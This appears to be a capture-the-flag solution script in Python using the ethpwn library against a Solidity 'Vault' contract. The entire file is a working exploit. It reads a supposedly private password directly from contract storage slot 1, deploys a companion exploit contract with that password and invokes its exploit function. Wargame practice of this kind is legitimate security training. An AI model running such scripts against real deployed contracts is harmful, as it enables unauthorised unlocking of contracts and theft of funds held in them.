#!/usr/bin/env python3

import sys
from ethpwn import *
from ethpwn.ethlib.cli import register as register_contract

from time import sleep

import argparse


parser = argparse.ArgumentParser()
parser.add_argument('proxy_addr', type=str)
ARGS = parser.parse_args()

context.log_level = 'DEBUG'

CONTRACT_METADATA.compile_solidity_files(['./vault.sol', './exploit.sol'])

vault = register_contract('Vault', ARGS.proxy_addr, source_files=['./vault.sol'], find_optimizer_settings_to_match_bytecode=True)
vault_instance = contract_registry().get(vault.address)

password = context.w3.eth.get_storage_at(vault.address, 1)
print(password)

with CONTRACT_METADATA['Exploit'].deploy_destructible(ARGS.proxy_addr, password) as (tx_hash, target):
    print(f"Exploit contract is at {target.address}")
    sleep(2)

    transact(target.functions.exploit())
